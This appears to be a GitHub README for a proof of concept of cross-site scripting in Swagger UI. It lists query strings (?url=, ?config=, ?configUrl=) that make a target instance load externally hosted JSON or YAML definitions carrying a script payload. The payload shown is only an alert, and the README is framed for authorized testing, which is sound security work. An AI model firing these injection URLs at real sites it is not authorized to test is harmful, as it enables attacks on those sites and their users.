## Swagger UI XSS Proof of Concept

### Description

Swagger UI allows you to load externally sourced API definitions using the `?url=`, `?config=`, or `?configUrl=` parameters. When fields such as the description (`description`) in these definitions are processed without filtering HTML or JavaScript, an XSS (Cross-site Scripting) vulnerability may arise.

This PoC includes a minimal YAML and JSON file that triggers `alert(‘XSS-Found!’)` through the aforementioned vulnerability. By loading these files to Swagger UI instances intended for testing, XSS behavior can be observed.

---

### PoC Usage

Use the following query strings with a vulnerable Swagger UI path, such as:

`https://target-swagger.com/swagger/index.html?<QUERY>`

#### JSON-based PoC

?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json

?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json

?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json

#### YAML-based PoC

?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml

?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml

?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml


If the instance is vulnerable, the following will execute: alert("XSS-Found!")

---
For educational and authorized testing purposes only.
